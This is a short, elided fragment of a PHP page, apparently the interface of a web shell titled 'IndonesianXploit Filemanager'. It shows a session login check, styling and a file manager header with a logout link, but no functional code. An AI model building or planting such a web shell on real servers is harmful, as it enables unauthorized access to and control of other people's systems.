...
if (!isset($_SESSION['logged_in'])) {
    ...
    <head>
        ...
        <style>
            ...
            input, button { padding:10px; background:#333; border:none; color:#fff; margin-top:5px; }
            .box { background:#222; display:inline-block; padding:20px; border-radius:8px; }
        </style>
    </head>
    <body>
        <div class='box'>
...
<html>
<head>
<title>IndonesianXploit Filemanager</title>
<style>
...
<body>
<div class='container'>
    <h2>File Manager <a class="logout" href="?logout=1">Logout</a></h2>
